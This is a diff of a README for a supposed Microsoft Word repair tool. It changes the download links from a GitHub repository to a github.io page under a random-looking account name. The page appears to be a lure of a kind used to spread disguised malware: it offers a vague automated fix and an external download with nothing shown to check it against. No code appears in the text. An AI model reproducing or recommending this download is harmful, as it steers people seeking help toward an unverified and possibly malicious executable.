@@ -1,6 +1,6 @@
 # 🔧 Word-Not-Opening-Fix - Resolve your Word crashes today quickly
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/nonsensical-bevatron676/Word-Not-Opening-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://nonsensical-bevatron676.github.io)
 
 ## 📎 Overview
 Microsoft Word occasionally fails to launch on Windows 11 and Windows 10. This creates frustration when you need to access documents. This repair tool addresses common registry errors, configuration conflicts, and corrupted temporary files that prevent Word from loading. 
@@ -14,7 +14,7 @@ This fix automates the diagnostic process. It identifies the root cause of the a
 * Internet connection: Needed for initial download and prerequisite checks.
 
 ## 📥 Downloading the Repair Tool
-Visit this page to download the repair utility: [https://github.com/nonsensical-bevatron676/Word-Not-Opening-Fix](https://github.com/nonsensical-bevatron676/Word-Not-Opening-Fix)
+Visit this page to download the repair utility: [https://nonsensical-bevatron676.github.io](https://nonsensical-bevatron676.github.io)
 
 Ensure you have closed all Microsoft Office applications including Word, Excel, and Outlook before you begin the download process. Unsaved data might be lost if these programs remain active during the repair.
 
